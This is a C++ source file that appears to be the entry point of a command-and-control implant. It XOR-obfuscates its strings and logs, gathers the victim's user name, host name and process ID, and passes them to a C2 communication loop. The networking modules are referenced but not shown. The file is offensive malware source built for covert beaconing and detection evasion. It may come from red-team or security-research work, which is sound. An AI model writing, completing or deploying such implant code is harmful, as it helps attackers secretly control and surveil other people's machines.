#include <iostream>

#include "comms.hpp"
#include "core.hpp"
#include "XorLogger.hpp"
#include "settings.hpp"
#include "xor_string.hpp"

int main() {

    std::vector<unsigned char> key = { 0xFE, 0xED, 0xCA, 0xFE };

    // Initialize logger in debug mode to enable plaintext stdout logging
    int init_result = XorLogger::InitializeLogger(XOR_LIT("fdlog.log"), key);
    if (init_result != 0) {
        std::cerr << XOR_LIT("Failed to initialize logger. Error code: ") << init_result << std::endl;
        return init_result;
    }

    if (!LoadConfig()) {
        XorLogger::LogError(XOR_LIT("Load configuration unsuccessful"));
        return -1;
    }
    XorLogger::LogSuccess(XOR_LIT("Loaded configuration successfully"));
    
    std::string discovery_info = std::string(GetUserName()) + "\n" + std::string(GetHostName()) + "\n" + std::to_string(GetPID());

    Communication::C2CommsLoop(discovery_info);

    return 0;
}